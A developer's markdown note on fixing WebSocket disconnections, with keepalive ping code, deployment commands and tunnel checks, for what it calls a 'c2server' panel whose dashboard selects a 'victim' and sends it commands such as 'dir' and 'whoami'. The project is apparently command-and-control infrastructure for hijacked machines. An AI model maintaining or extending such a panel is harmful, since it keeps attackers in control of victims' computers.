# WebSocket Disconnection Fix

## Problem
WebSocket connection was disconnecting and reconnecting every time a command was sent.

## Root Causes Found

### 1. **No Keepalive/Ping Mechanism**
- Cloudflare tunnels timeout idle WebSocket connections after ~100 seconds
- No ping/pong messages were being sent to keep the connection alive
- Result: Connection dropped during idle periods or under load

### 2. **Cleanup Race Condition**
- WebSocket cleanup function could trigger reconnection loop
- No distinction between intentional and unintentional disconnections
- Result: Unnecessary reconnection attempts

### 3. **Outdated Tunnel URL**
- `.env.local` had an old Cloudflare tunnel URL
- Frontend was trying to connect to wrong endpoint
- Result: Connection failures and mismatched endpoints

## Fixes Applied

### Frontend Changes (`lib/websocket.ts`)

✅ **Added Keepalive Ping**
```typescript
// Sends ping every 30 seconds to prevent timeout
pingIntervalRef.current = setInterval(() => {
  if (socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify({ type: "ping" }));
  }
}, 30000);
```

✅ **Improved Cleanup Logic**
```typescript
// Prevents reconnection on intentional close
intentionalCloseRef.current = true;
if (socket && socket.readyState !== WebSocket.CLOSED) {
  socket.close();
}
```

✅ **Better Error Handling**
- Added console logging for debugging
- Ignores pong responses to prevent state updates
- Proper cleanup of timers and intervals

### Backend Changes (`websocket/hub.go`)

✅ **Added Ping/Pong Handler**
```go
// Responds to ping messages with pong
if msgStr == `{"type":"ping"}` || msgStr == "ping" {
  log.Printf("[WS] Received ping, sending pong")
  c.Send <- []byte(`{"type":"pong"}`)
  continue
}
```

### Configuration Update (`.env.local`)

✅ **Updated WebSocket URL**
```env
NEXT_PUBLIC_WS_URL=wss://edinburgh-salaries-walter-tulsa.trycloudflare.com/ws
```

## Deployment Steps

### 1. Rebuild Backend (on Azure VM)
```bash
ssh azureuser@4.246.65.152
cd ~/FunnyChistosoPanel/backend

# Pull latest changes
git pull

# Rebuild
go build -o c2server-main

# Restart backend (kills old process and starts new one)
pkill -f c2server-main
nohup ./c2server-main > ~/c2panel.log 2>&1 &

# Verify it's running
tail -f ~/c2panel.log
```

### 2. Restart Frontend (if running locally)
```bash
cd D:\FunnyChistosoPanel\frontend

# Kill existing process (if any)
# Ctrl+C in the terminal running npm run dev

# Start fresh
npm run dev
```

### 3. Verify on Production (Vercel)
The frontend on Vercel will automatically redeploy when you push to GitHub:
```bash
cd D:\FunnyChistosoPanel
git add frontend/lib/websocket.ts frontend/.env.local
git commit -m "fix: WebSocket disconnection with keepalive ping"
git push
```

## Testing

### 1. Open Browser DevTools → Console
You should see WebSocket logs:
```
[WS] Connecting to wss://...
[WS] Connected
[WS] Sent ping
[WS] Received pong
```

### 2. Send Test Commands
```
- Open dashboard
- Select victim
- Send command: "dir"
- Watch console - connection should stay alive
- Send another command: "whoami"
- Connection should NOT disconnect/reconnect
```

### 3. Monitor Backend Logs
```bash
ssh azureuser@4.246.65.152
tail -f ~/c2panel.log | grep WS
```

Expected output every 30 seconds:
```
[WS] Received ping, sending pong
```

## Success Indicators

✅ No more `[WS] Disconnected` / `[WS] Reconnecting` spam in browser console  
✅ Ping/pong messages every 30 seconds in both frontend and backend logs  
✅ Commands execute without triggering WebSocket reconnection  
✅ Connection stays alive for extended periods (10+ minutes)  
✅ Output appears immediately in Terminal component  

## If Still Having Issues

### Check Cloudflare Tunnel is Running
```bash
ssh azureuser@4.246.65.152
ps aux | grep cloudflared
```

### Check WebSocket Endpoint is Accessible
```bash
curl -i -N -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: test" \
  https://edinburgh-salaries-walter-tulsa.trycloudflare.com/ws
```

Expected response: `HTTP 101 Switching Protocols`

### Restart Cloudflare Tunnel
```bash
ssh azureuser@4.246.65.152
pkill cloudflared
nohup cloudflared tunnel --url http://localhost:8080 > ~/tunnel.log 2>&1 &
```

### Check for CORS Issues
Open browser DevTools → Network → WS → Headers  
Verify:
- `Sec-WebSocket-Protocol`: should be empty or match server
- `Origin`: should be `https://funnychistoso-panel.vercel.app`
- Status: should be `101 Switching Protocols`

## Technical Notes

### Why 30 Second Ping Interval?
- Cloudflare idle timeout: ~100 seconds
- Common proxy timeout: 60 seconds
- 30 seconds: Safe margin with minimal overhead
- Can be adjusted in `websocket.ts` line 33

### Why JSON Messages Instead of WebSocket Ping Frames?
- Fiber WebSocket library abstracts ping/pong frames
- JSON messages work across all proxies and CDNs
- Easier to debug in browser DevTools
- More control over ping/pong logic

### Alternative: Native WebSocket Ping
If you want to use native ping frames instead:
```typescript
// Frontend - not needed, browser handles it
// Backend - add to hub.go:
conn.SetPingHandler(func(appData string) error {
  conn.WriteControl(websocket.PongMessage, []byte{}, time.Now().Add(time.Second))
  return nil
})
```

But JSON-based ping/pong is more reliable across proxies.
